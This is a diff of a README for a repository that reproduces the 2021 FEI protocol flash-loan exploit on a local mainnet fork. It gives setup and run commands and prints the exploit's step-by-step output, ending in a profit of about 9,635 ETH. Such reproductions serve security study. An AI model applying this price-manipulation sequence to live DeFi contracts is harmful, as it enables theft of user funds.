@@ -1,18 +1,69 @@
 # fei-repro
-Repro of FEI protocol hack -- thanks Immunefi, Lucash-dev, Pepin, Faith for your assistance in figuring out the interfaces
+Repro of FEI protocol hack on ubuntu:24.04
 
-My goal was to learn about forking the mainnet, and reproducing an exploit -- I landed upon the article written by Lucash-dev for Immunefi, note that it was published in June 2021.
+Link for read: https://medium.com/immunefi/a-guide-to-reproducing-ethereum-exploits-fei-protocol-224b30b517d6
 
-Link: https://medium.com/immunefi/a-guide-to-reproducing-ethereum-exploits-fei-protocol-224b30b517d6
+Link for read: https://medium.com/@Brian.IsMeta/difficulty-of-reproducing-old-exploits-a613da2c2143
 
-I was following this article step-by-step, but within a few steps was already having an issue -- technology moves quickly, and even a little more than a year is an eternity when it comes to web3 and its tools.  Hardhat changed its wizard and sample files, and for getting the exploit to run, it became an increasingly difficult task.
+## for work on ubuntu:24.04
 
-I wrote an article about it, after spending hours and not able to get it to run.
+### start ubuntu:24.04
+```
+docker run -it --rm ubuntu:24.04 /bin/bash
+```
 
-Link: https://medium.com/@Brian.IsMeta/difficulty-of-reproducing-old-exploits-a613da2c2143
+### install dependency
+```
+apt-get update&& apt-get -y install curl git sudo nano mc
+curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
+source ~/.bashrc
+nvm install v22.20.0
+npm install -g npm@11.6.1
+npm install --global yarn
+yarn add hardhat
+```
 
-I reached out to Immunefi on Discord to get some assistance, and Pepin and Faith helped guide me on the path, and I worked on getting the other ones into the script, removing all the clutter of unneeded code / functions.  
+### clone source
+```
+git clone https://github.com/klssstis/fei-repro&&cd fei-repro/
+```
 
-Please note that the interfaces I include here are VERY trimmed down -- they are not the actual full interfaces, I only included function prototypes for things that are actually called by the exploit code!!!!!
+### insert your key
+```
+sed -i "s/<PUT YOUR API KEY HERE>/keykeykeykeykeykeykeykeykey/g" hardhat.config.js_
+sed -i "s/<PUT YOUR API KEY HERE>/keykeykeykeykeykeykeykeykey/g" scripts/fei.js
+```
 
-I hope this is helpful for anyone trying to run this exploit.
+### select hardhat-2
+```
+npx hardhat --init
+```
+
+### clean folder, after init
+```
+mv hardhat.config.js_ hardhat.config.js
+rm contracts/Lock.sol
+```
+### start exploit 
+```
+npx hardhat run scripts/fei.js --verbose
+```
+### output
+```
+Exploit deployed to: 0x09635F643e140090A9A8Dcd712eD6285858ceBef
+Balance before exploit 0n ETH
+starting exploit
+Updated oracle
+Received WETH flashloan with premium 269
+Dumped 207569 ETH on WETH/FEI pool
+Bought Fei from bonding curve for 92430 ETH
+Allocated ETH from Fei protocol
+Swapped 527742092 Fei on WETH/FEI pool
+Repaying ETH flashloan
+
+##################################
+ETH balance 9635065665081975267661 9635
+If the balance is positive the exploit worked!
+Balance after exploit 9635065665081975267661n ETH
+```
+
